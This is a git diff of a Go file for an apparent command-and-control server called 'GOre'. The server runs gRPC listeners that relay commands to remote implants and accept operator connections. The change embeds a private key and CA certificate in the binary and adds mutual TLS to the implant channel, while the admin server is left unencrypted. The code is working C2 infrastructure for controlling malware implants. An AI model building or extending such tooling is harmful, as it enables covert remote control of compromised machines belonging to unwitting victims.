@@ -2,6 +2,9 @@ package main
 
 import (
 	"context"
+	"crypto/tls"
+	"crypto/x509"
+	_ "embed"
 	"fmt"
 	"gore/grpcapi" //the pain to get this to work was immense. Golang needs to slow the fuck down and stop depreciating packages.
 	"log"
@@ -9,15 +12,28 @@ import (
 	"strconv"
 
 	"google.golang.org/grpc"
+	"google.golang.org/grpc/credentials"
 )
 
 // TODO: make this not in-memory, and instead be an indexable database.
+// certificates and keys are embeded into the file to be accessed at runtime only.
 var (
 	implant_map   = map[string]implantServer{} // gloablly accessable map for UUID's to implant structs
 	server_ip     string                       //compile-time ip
 	server_port   string                       //compile-time port
 	operator_port string                       //compile time admin server port
 )
+
+//embed the required files into the binary
+
+//go:embed server.pem
+var server_pem []byte
+
+//go:embed server.key
+var server_key []byte
+
+//go:embed CAcert.pem
+var cacert_pem []byte
 
 /*It should be said, I think that these commands are invoked automatically, based on the RPC that was recieved, as the server decides what to do and when to do it. We don't invoke these explicitly, yet they are invoked.*/
 // create a struct for handling commands
@@ -156,26 +172,47 @@ func main() {
 	//convert port strings to int
 	server_port_num, _ := strconv.Atoi(server_port)
 	operator_port_num, _ := strconv.Atoi(operator_port)
-	//TODO: load file and read TLS data
+
+	//testing to see if the file actually loads
+	//fmt.Println("[+] TLS data:")
+	//fmt.Println(string(server_key))
+	//fmt.Println(string(server_pem))
+
+	// Load the server certificate and its key
+	serverCert, err := tls.X509KeyPair(server_pem, server_key)
+	if err != nil {
+		log.Fatalf("[!] Failed to load server certificate and key. %s.", err)
+	}
+	// Load the CA certificate
+	// Put the CA certificate to certificate pool
+	certPool := x509.NewCertPool()
+	if !certPool.AppendCertsFromPEM(cacert_pem) {
+		log.Fatalf("[!] Failed to append trusted certificate to certificate pool. %s.", err)
+	}
+	// Create the TLS configuration
+	tlsConfig := &tls.Config{
+		Certificates: []tls.Certificate{serverCert},
+		RootCAs:      certPool,
+		ClientCAs:    certPool,
+		MinVersion:   tls.VersionTLS13,
+		MaxVersion:   tls.VersionTLS13,
+	}
+	// Create a new TLS credentials based on the TLS configuration
+	cred := credentials.NewTLS(tlsConfig)
+	opts = []grpc.ServerOption{grpc.Creds(cred)}
 	//create channels for passing input and output commands to implant and admin services
 	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
 	//instantiate a new implant to act as a device client and an admin server. We're doing this on the same channel, so IPC between them is shared on the same goroutine.
-	//implant := NewImplantServer(work, output)
 	admin := NewAdminServer(work, output) //both share the same work and output
-	//open and bind port 5000 on localhost on the server to listen to commands over tcp, check if nil and log a fatal error if so
-	/*if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 5000)); err != nil {
-		fmt.Println("[-] implantListener has failed.")
-		log.Fatal(err)
-	}*/
-	//do the same for an admin server, with a differnet port of course
+	//open connection admin server, with a differnet port of course
 	if adminListener, err = net.Listen("tcp", fmt.Sprintf("%s:%d", server_ip, operator_port_num)); err != nil {
-		fmt.Println("[-] adminListener has failed.")
+		fmt.Println("[!] adminListener has failed.")
 		log.Fatal(err)
 	}
 	fmt.Printf("[+] GOre server is serving admin clients on %s:%d\n", server_ip, operator_port_num)
 	//the "..." operator implies an input with a variable number of inputs, kinda like explicit function overloading. We declare that opts might have more variables associated with them than we specify.
-	grpcAdminServer := grpc.NewServer(opts...)
-	//grpcImplantServer := grpc.NewServer(opts...)
+	//grpcAdminServer := grpc.NewServer(opts...)
+	grpcAdminServer := grpc.NewServer()
 	//register the servers. Do note we never explicitly defined these, protoc did. By compiling our .proto file, it gave us Golang functions for fri.
 	//grpcapi.RegisterImplantServer(grpcImplantServer, implant)
 	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
@@ -185,9 +222,10 @@ func main() {
 		implant := NewImplantServer(work, output)
 		//use "tcp4/" to bind ONLY to ipv4, jsut "tcp" will bind to ipv6 OR ipv4
 		if implantListener, err = net.Listen("tcp", fmt.Sprintf("%s:%d", server_ip, server_port_num)); err != nil {
-			fmt.Println("[-] implantListener has failed.")
+			fmt.Println("[!] implantListener has failed.")
 			log.Fatal(err)
 		}
+		//init implant server with self- generated credentials
 		grpcImplantServer := grpc.NewServer(opts...)
 		grpcapi.RegisterImplantServer(grpcImplantServer, implant)
 		//serve the implant server as its own goroutine
@@ -196,5 +234,4 @@ func main() {
 	}()
 	//admin server is not multithreaded, only one expected. For now.
 	grpcAdminServer.Serve(adminListener)
-
 }
